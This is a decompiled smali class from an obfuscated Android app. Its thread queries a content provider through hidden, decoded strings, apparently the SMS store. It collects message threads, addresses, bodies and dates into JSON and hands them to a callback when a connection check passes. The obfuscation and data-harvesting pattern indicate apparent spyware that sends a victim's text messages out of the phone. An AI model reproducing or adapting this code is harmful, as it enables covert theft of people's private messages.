.class public Lru/jdhndtpk/iypwqbmltdwdk/b;
.super Ljava/lang/Thread;


# instance fields
.field private a:La/a/b/a;

.field private b:I


# direct methods
.method public constructor <init>(La/a/b/a;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->a:La/a/b/a;

    return-void
.end method

.method public constructor <init>(La/a/b/a;I)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput p2, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->b:I

    iput-object p1, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->a:La/a/b/a;

    return-void
.end method

.method private a()V
    .locals 10

    const/4 v2, 0x0

    new-instance v8, Lorg/json/JSONArray;

    invoke-direct {v8}, Lorg/json/JSONArray;-><init>()V

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "ZtipvyYZQyIGy"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "maZNfUtaVhnEiCapLhZreDtzcI"

    invoke-static {v4}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget v4, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->b:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    if-nez v9, :cond_0

    invoke-direct {p0, v8}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    :goto_0
    return-void

    :cond_0
    invoke-interface {v9}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-direct {p0, v8}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    invoke-interface {v9}, Landroid/database/Cursor;->close()V

    goto :goto_0

    :cond_1
    :try_start_0
    new-instance v1, Lru/jdhndtpk/iypwqbmltdwdk/c;

    const-string v0, "GAtuFnceMMiNKlxmtwz"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    const-string v0, "okurIwhLsBwaYIrtiBLHJXU"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v3

    const-string v0, "kOnuNpirgCfMZFTzqlDMBRCuGUFX"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    const-string v0, "bSzGjISHxcfRIY"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    const-string v0, "ffbNdZcLDPFBBibTzSfEQVG"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-direct/range {v1 .. v7}, Lru/jdhndtpk/iypwqbmltdwdk/c;-><init>(IILjava/lang/String;Ljava/lang/String;J)V

    invoke-virtual {v1}, Lru/jdhndtpk/iypwqbmltdwdk/c;->a()Lorg/json/JSONObject;

    move-result-object v0

    invoke-virtual {v8, v0}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-interface {v9}, Landroid/database/Cursor;->close()V

    invoke-direct {p0, v8}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method private a(Lorg/json/JSONArray;)V
    .locals 3

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->d()Lru/jdhndtpk/iypwqbmltdwdk/a/d;

    move-result-object v0

    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a/d;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->a:La/a/b/a;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object p1, v1, v2

    invoke-interface {v0, v1}, La/a/b/a;->a([Ljava/lang/Object;)V

    :cond_0
    return-void
.end method

.method private b()V
    .locals 9

    const/4 v8, 0x2

    const/4 v2, 0x0

    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6}, Lorg/json/JSONArray;-><init>()V

    invoke-static {}, Lru/jdhndtpk/iypwqbmltdwdk/YOytzTerr;->a()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "ZtipvyYZQyIGy"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    if-nez v2, :cond_0

    invoke-direct {p0, v6}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    :goto_0
    return-void

    :cond_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    invoke-direct {p0, v6}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    goto :goto_0

    :cond_1
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    :cond_2
    const/4 v1, 0x0

    invoke-virtual {v3}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_3
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_8

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lru/jdhndtpk/iypwqbmltdwdk/d;

    iget v5, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->a:I

    const-string v7, "CYkfdrkvPIhHbrMfU"

    invoke-static {v7}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v2, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    if-ne v5, v7, :cond_3

    const/4 v1, 0x1

    const-string v4, "okurIwhLsBwaYIrtiBLHJXU"

    invoke-static {v4}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    if-ne v4, v8, :cond_4

    iget v4, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->c:I

    add-int/lit8 v4, v4, 0x1

    iput v4, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->c:I

    move v0, v1

    :goto_1
    if-eqz v0, :cond_5

    :goto_2
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {v3}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_3
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_7

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lru/jdhndtpk/iypwqbmltdwdk/d;

    :try_start_0
    invoke-virtual {v0}, Lru/jdhndtpk/iypwqbmltdwdk/d;->a()Lorg/json/JSONObject;

    move-result-object v0

    invoke-virtual {v6, v0}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_3

    :cond_4
    iget v4, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->b:I

    add-int/lit8 v4, v4, 0x1

    iput v4, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->b:I

    move v0, v1

    goto :goto_1

    :cond_5
    new-instance v0, Lru/jdhndtpk/iypwqbmltdwdk/d;

    const-string v1, "kOnuNpirgCfMZFTzqlDMBRCuGUFX"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Lru/jdhndtpk/iypwqbmltdwdk/d;-><init>(Ljava/lang/String;)V

    const-string v1, "CYkfdrkvPIhHbrMfU"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v1

    iput v1, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->a:I

    const-string v1, "okurIwhLsBwaYIrtiBLHJXU"

    invoke-static {v1}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v2, v1}, Landroid/database/Cursor;->getInt(I)I

    move-result v1

    if-ne v1, v8, :cond_6

    iget v1, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->c:I

    add-int/lit8 v1, v1, 0x1

    iput v1, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->c:I

    :goto_4
    invoke-virtual {v3, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_6
    iget v1, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->b:I

    add-int/lit8 v1, v1, 0x1

    iput v1, v0, Lru/jdhndtpk/iypwqbmltdwdk/d;->b:I

    goto :goto_4

    :cond_7
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    invoke-direct {p0, v6}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a(Lorg/json/JSONArray;)V

    goto/16 :goto_0

    :cond_8
    move v0, v1

    goto :goto_1
.end method


# virtual methods
.method public run()V
    .locals 2

    invoke-super {p0}, Ljava/lang/Thread;->run()V

    iget v0, p0, Lru/jdhndtpk/iypwqbmltdwdk/b;->b:I

    const/4 v1, 0x1

    if-ge v0, v1, :cond_0

    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/b;->b()V

    :goto_0
    return-void

    :cond_0
    invoke-direct {p0}, Lru/jdhndtpk/iypwqbmltdwdk/b;->a()V

    goto :goto_0
.end method
